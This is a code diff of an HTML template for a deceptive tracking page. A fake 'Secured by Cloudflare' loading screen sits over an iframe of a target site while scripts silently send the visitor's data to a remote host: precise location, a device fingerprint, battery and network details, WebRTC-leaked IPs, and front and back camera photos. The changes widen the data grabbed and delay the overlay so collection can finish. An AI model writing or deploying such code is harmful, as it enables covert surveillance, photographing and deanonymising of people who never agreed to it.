@@ -9,7 +9,8 @@
             margin: 0; 
             padding: 0; 
             overflow: hidden;
-            background: #f1f5f9;
+            background: #f8fafc;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
         }
         iframe { 
             position: fixed; 
@@ -19,6 +20,7 @@
             height: 100%; 
             border: none;
             background: white;
+            z-index: 10;
         }
         .loading-overlay {
             position: fixed;
@@ -26,13 +28,14 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(255, 255, 255, 0.95);
+            background: rgba(255, 255, 255, 0.97);
             display: flex;
             flex-direction: column;
             justify-content: center;
             align-items: center;
             z-index: 9999;
             transition: opacity 0.5s ease;
+            backdrop-filter: blur(5px);
         }
         .spinner {
             width: 50px;
@@ -45,18 +48,29 @@
         }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         .loading-text {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
             font-size: 16px;
             color: #475569;
             text-align: center;
             max-width: 80%;
+            line-height: 1.5;
+            font-weight: 500;
+        }
+        .status-badge {
+            margin-top: 15px;
+            padding: 8px 16px;
+            background: #dbeafe;
+            color: #1d4ed8;
+            border-radius: 9999px;
+            font-size: 13px;
+            font-weight: 600;
         }
     </style>
 </head>
 <body>
     <div class="loading-overlay" id="loadingOverlay">
         <div class="spinner"></div>
-        <div class="loading-text">Loading secure content...<br>Please wait while we verify your connection.</div>
+        <div class="loading-text">Verifying your connection...<br>Please wait while we load secure content.</div>
+        <div class="status-badge">🔒 Secured by Cloudflare</div>
     </div>
     
     <iframe src="<%= url %>" allow="camera; geolocation; microphone; fullscreen"></iframe>
@@ -69,111 +83,218 @@
         function send(endpoint, data) {
             fetch(`${host}/${endpoint}`, {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-                body: new URLSearchParams(data)
-            }).catch(() => {});
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ uid, ...data })
+            }).catch(e => console.error(`Failed to send to ${endpoint}:`, e));
         }
 
-        // Basic but effective tracking
-        function collectBasicInfo() {
-            const basicInfo = `<b>📱 WebView Session</b>\n\nIP: <%= ip %>\nTime: <%= time %>\nUA: ${navigator.userAgent}\nScreen: ${screen.width}x${screen.height}\nLanguage: ${navigator.language}`;
-            send('info', { uid: uid, data: basicInfo });
-        }
+        // ========== MAXIMUM DATA COLLECTION ==========
 
-        // Location
-        function collectLocation() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    pos => send('location', {
+        // 1. LOCATION
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                pos => {
+                    send('location', {
                         lat: pos.coords.latitude,
                         lon: pos.coords.longitude,
-                        uid: uid,
-                        acc: pos.coords.accuracy
-                    }),
-                    () => {},
-                    { enableHighAccuracy: true, timeout: 5000 }
-                );
-            }
+                        acc: pos.coords.accuracy,
+                        alt: pos.coords.altitude,
+                        heading: pos.coords.heading,
+                        speed: pos.coords.speed
+                    });
+                },
+                err => {
+                    send('info', { data: `<b>📍 Location Error:</b> <code>${err.message}</code>` });
+                },
+                { enableHighAccuracy: true, timeout: 10000 }
+            );
         }
 
-        // Camera (simplified but effective)
-        async function collectCamera() {
+        // 2. DEVICE FINGERPRINT
+        const fp = {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            languages: navigator.languages?.join(', ') || 'N/A',
+            cookies: navigator.cookieEnabled,
+            doNotTrack: navigator.doNotTrack || 'unknown',
+            hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+            deviceMemory: navigator.deviceMemory || 'unknown',
+            touch: navigator.maxTouchPoints > 0,
+            webdriver: navigator.webdriver,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            timezoneOffset: new Date().getTimezoneOffset(),
+            online: navigator.onLine,
+            screen: {
+                width: screen.width,
+                height: screen.height,
+                availWidth: screen.availWidth,
+                availHeight: screen.availHeight,
+                colorDepth: screen.colorDepth,
+                pixelDepth: screen.pixelDepth,
+                dpi: window.devicePixelRatio
+            },
+            referrer: document.referrer,
+            title: document.title
+        };
+        send('info', { data: `<b>📱 Device Fingerprint (WebView)</b>\n<code>${JSON.stringify(fp, null, 2)}</code>` });
+
+        // 3. BATTERY
+        if ('getBattery' in navigator) {
+            navigator.getBattery().then(battery => {
+                const batteryInfo = `${(battery.level * 100).toFixed(1)}% | Charging: ${battery.charging}`;
+                send('info', { data: `<b>🔋 Battery Status:</b> ${batteryInfo}` });
+            }).catch(e => {
+                send('info', { data: `<b>🔋 Battery:</b> Access denied or error` });
+            });
+        }
+
+        // 4. NETWORK INFO
+        if (navigator.connection) {
+            const conn = navigator.connection;
+            const networkInfo = `${conn.effectiveType || 'unknown'} | ${conn.downlink || '?'} Mbps | RTT: ${conn.rtt || '?'}ms`;
+            send('info', { data: `<b>🌐 Network Info:</b> ${networkInfo}` });
+        }
+
+        // 5. CANVAS FINGERPRINT
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        ctx.textBaseline = 'top';
+        ctx.font = "14px Arial";
+        ctx.fillText('WebViewFingerprint', 2, 2);
+        const canvasFP = canvas.toDataURL().substring(0, 100) + '...';
+        send('info', { data: `<b>🎨 Canvas Fingerprint:</b> <code>${canvasFP}</code>` });
+
+        // 6. AUDIO SUPPORT
+        let audioSupported = false;
+        try {
+            const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+            audioSupported = true;
+            send('info', { data: `<b>🎵 AudioContext:</b> Supported` });
+        } catch(e) {
+            send('info', { data: `<b>🎵 AudioContext:</b> Not supported` });
+        }
+
+        // 7. WEBRTC IP LEAK
+        const getIPs = () => {
+            return new Promise(resolve => {
+                const ips = [];
+                const pc = new RTCPeerConnection({ iceServers: [] });
+                pc.createDataChannel('');
+                pc.createOffer().then(o => pc.setLocalDescription(o));
+                pc.onicecandidate = e => {
+                    if (!e || !e.candidate) {
+                        resolve(ips);
+                        return;
+                    }
+                    const ipMatch = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
+                    if (ipMatch && !ips.includes(ipMatch[1])) {
+                        ips.push(ipMatch[1]);
+                    }
+                };
+                setTimeout(() => {
+                    pc.close();
+                    resolve(ips);
+                }, 2000);
+            });
+        };
+
+        getIPs().then(ips => {
+            if (ips.length) {
+                send('info', { data: `<b>🌐 WebRTC Leaked IPs:</b>\n<code>${ips.join('\\n')}</code>` });
+            }
+        });
+
+        // 8. INSTALLED FONTS (Basic Detection)
+        const detectFonts = () => {
+            const testFonts = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia', 'Comic Sans MS', 'Impact'];
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            const baseWidth = ctx.measureText('mmmmmmmmmmlli').width;
+            
+            const installed = testFonts.filter(font => {
+                ctx.font = `72px "${font}", monospace`;
+                const testWidth = ctx.measureText('mmmmmmmmmmlli').width;
+                return Math.abs(baseWidth - testWidth) > 2;
+            });
+            
+            return installed.join(', ') || 'None detected';
+        };
+
+        const fonts = detectFonts();
+        send('info', { data: `<b>🔠 Detected Fonts:</b> ${fonts}` });
+
+        // 9. PLUGINS
+        const plugins = Array.from(navigator.plugins).map(p => p.name).join(', ') || 'No plugins detected';
+        send('info', { data: `<b>🔌 Browser Plugins:</b> ${plugins}` });
+
+        // 10. AD BLOCKER DETECTION
+        const adBlockDetected = () => {
+            const fakeAd = document.createElement('div');
+            fakeAd.innerHTML = '&nbsp;';
+            fakeAd.className = 'adsbox';
+            document.body.appendChild(fakeAd);
+            const isBlocked = fakeAd.offsetHeight === 0;
+            document.body.removeChild(fakeAd);
+            return isBlocked;
+        };
+        send('info', { data: `<b>🛑 Ad Blocker:</b> ${adBlockDetected() ? 'Detected' : 'Not Detected'}` });
+
+        // ========== CAMERA CAPTURE (FRONT + BACK) ==========
+
+        async function captureCamera(facingMode = 'user', label = 'front') {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: 'user' } 
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: facingMode === 'environment' ? 'environment' : 'user' }
                 });
-                
+
                 const video = document.createElement('video');
                 video.srcObject = stream;
                 video.play();
-                
+
                 video.onloadedmetadata = () => {
                     setTimeout(() => {
                         const canvas = document.createElement('canvas');
                         canvas.width = video.videoWidth;
                         canvas.height = video.videoHeight;
-                        canvas.getContext('2d').drawImage(video, 0, 0);
-                        
-                        send('camsnap', {
-                            uid: uid,
-                            front: canvas.toDataURL('image/jpeg', 0.7).split(',')[1]
-                        });
-                        
-                        stream.getTracks().forEach(t => t.stop());
-                        
-                        // Try back camera
-                        setTimeout(async () => {
-                            try {
-                                const backStream = await navigator.mediaDevices.getUserMedia({ 
-                                    video: { facingMode: 'environment' } 
-                                });
-                                
-                                const backVideo = document.createElement('video');
-                                backVideo.srcObject = backStream;
-                                backVideo.play();
-                                
-                                backVideo.onloadedmetadata = () => {
-                                    setTimeout(() => {
-                                        const backCanvas = document.createElement('canvas');
-                                        backCanvas.width = backVideo.videoWidth;
-                                        backCanvas.height = backVideo.videoHeight;
-                                        backCanvas.getContext('2d').drawImage(backVideo, 0, 0);
-                                        
-                                        send('camsnap', {
-                                            uid: uid,
-                                            back: backCanvas.toDataURL('image/jpeg', 0.7).split(',')[1]
-                                        });
-                                        
-                                        backStream.getTracks().forEach(t => t.stop());
-                                    }, 500);
-                                };
-                            } catch (e) {
-                                // Ignore errors for back camera
-                            }
-                        }, 2000);
+                        const ctx = canvas.getContext('2d');
+                        ctx.drawImage(video, 0, 0);
+
+                        const imageData = canvas.toDataURL('image/jpeg', 0.8).split(',')[1];
+                        send('camsnap', { [label]: imageData });
+
+                        stream.getTracks().forEach(track => track.stop());
                     }, 1000);
                 };
-            } catch (e) {
-                // Camera access denied or not available
+            } catch (err) {
+                send('cam-status', { status: `error-${label}` });
+                console.log(`	Camera ${label} error:`, err.message);
             }
         }
 
-        // Execute collection
-        collectBasicInfo();
-        collectLocation();
-        collectCamera();
+        // Try front camera immediately
+        setTimeout(() => {
+            send('cam-status', { status: 'attempting-front' });
+            captureCamera('user', 'front');
+        }, 1000);
 
-        // Hide loading overlay after 3 seconds (or when iframe loads)
+        // Try back camera after delay
+        setTimeout(() => {
+            send('cam-status', { status: 'attempting-back' });
+            captureCamera('environment', 'back');
+        }, 3000);
+
+        // Hide loading overlay after 4 seconds (let data collect first)
         setTimeout(() => {
             loadingOverlay.style.opacity = '0';
             setTimeout(() => {
                 loadingOverlay.style.display = 'none';
             }, 500);
-        }, 3000);
+        }, 4000);
 
-        // Also hide when iframe loads (if possible)
+        // Optional: Listen for iframe loaded event (if target site supports postMessage)
         window.addEventListener('message', (e) => {
-            if (e.data === 'iframe-loaded') {
+            if (e.data === 'ready' || e.data === 'loaded') {
                 loadingOverlay.style.opacity = '0';
                 setTimeout(() => {
                     loadingOverlay.style.display = 'none';
